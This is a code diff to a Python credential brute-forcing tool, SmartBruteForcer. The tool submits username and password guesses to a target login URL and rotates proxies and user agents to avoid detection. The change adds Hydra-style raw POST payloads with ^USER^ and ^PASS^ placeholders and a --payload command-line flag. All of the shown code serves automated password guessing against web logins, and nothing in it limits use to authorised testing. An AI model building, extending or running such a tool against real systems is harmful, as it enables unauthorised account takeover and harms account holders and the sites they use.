@@ -119,6 +119,7 @@ class SmartBruteForcer:
         self.base_url = config['target_url']
         self.user_field = config.get('username_field', 'username')
         self.pass_field = config.get('password_field', 'password')
+        self.payload_raw = config.get('payload_raw') # Hydra-style raw data with ^USER^ and ^PASS^
         self.success_str = config.get('success_string')
         self.failure_str = config.get('failure_string')
         self.max_retries = config.get('max_retries', 3)
@@ -149,9 +150,16 @@ class SmartBruteForcer:
             proxy = self.proxy_manager.get_proxy() if self.proxy_manager else None
             user_agent = self.rotate_user_agent()
             
-            data = self.config.get('payload_template', {}).copy()
-            data[self.user_field] = username
-            data[self.pass_field] = password
+            # Prepare data
+            post_data = None
+            if self.payload_raw:
+                # Replace placeholders in raw string
+                post_data = self.payload_raw.replace('^USER^', username).replace('^PASS^', password)
+            else:
+                # Standard key-value mapping
+                post_data = self.config.get('payload_template', {}).copy()
+                post_data[self.user_field] = username
+                post_data[self.pass_field] = password
             
             headers = self.session.headers.copy()
             headers['User-Agent'] = user_agent
@@ -159,7 +167,7 @@ class SmartBruteForcer:
             try:
                 response = self.session.post(
                     self.base_url,
-                    data=data,
+                    data=post_data,
                     headers=headers,
                     proxies=proxy,
                     timeout=self.config.get('timeout', 15),
@@ -341,6 +349,7 @@ def main():
     parser.add_argument('-S', '--success-string', help='String indicating success')
     parser.add_argument('-F', '--failure-string', help='String indicating failure')
     parser.add_argument('--retries', type=int, default=3, help='Max retries per attempt')
+    parser.add_argument('--payload', help='Raw POST payload with ^USER^ and ^PASS^ placeholders')
     
     args = parser.parse_args()
     
@@ -372,6 +381,7 @@ def main():
         config['success_string'] = args.success_string
         config['failure_string'] = args.failure_string
         config['max_retries'] = int(args.retries)
+        config['payload_raw'] = args.payload
 
     if not usernames or not passwords or not config.get('target_url'):
         logger.error("Missing required parameters (URL, Users, Passwords).")
